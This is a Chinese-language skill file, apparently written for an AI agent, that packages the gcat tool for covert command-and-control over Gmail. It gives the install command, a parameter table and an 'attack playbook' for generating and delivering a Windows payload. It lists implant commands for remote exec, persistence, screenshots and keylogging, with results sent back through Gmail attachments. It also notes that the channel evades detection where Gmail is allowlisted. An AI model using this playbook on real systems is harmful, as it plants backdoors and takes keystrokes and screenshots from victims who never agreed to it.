---
name: gcat-gmail-c2
description: "gcat provides Gmail-channel covert C2. Signals: persistence, backdoor, interactive control, command set, Gmail attachment switching."
zh-signals: "gcat: Gmail 信道隐蔽 C2。信号:持久化,后门,交互式控制,指令集,切换 Gmail 附件。"
---

# gcat

- 攻击大类:C15 C2与远控
- 上游仓库:https://github.com/byt3bl33d3r/gcat
- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/byt3bl33d3r/gcat && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python gcat.py -g` | 生成 Windows payload |
| `python gcat.py -i keylog_interval` | 交互式控制 |
| ` implants 命令: exec / persistence / screenshot / keylogger` | 指令集 |
| `--new-image` | 切换 Gmail 附件 |

## 攻击场景 Playbook

### Gmail 信道隐蔽 C2

```bash
python gcat.py -g  # 生成 payload 投递
python gcat.py  # 收邮件指令/回传截图
```

## 注意事项

byt3bl33d3r 出品,用 Gmail 作为 C2 信道(邮件下发指令+附件回传),域控白名单 Gmail 时极隐蔽。
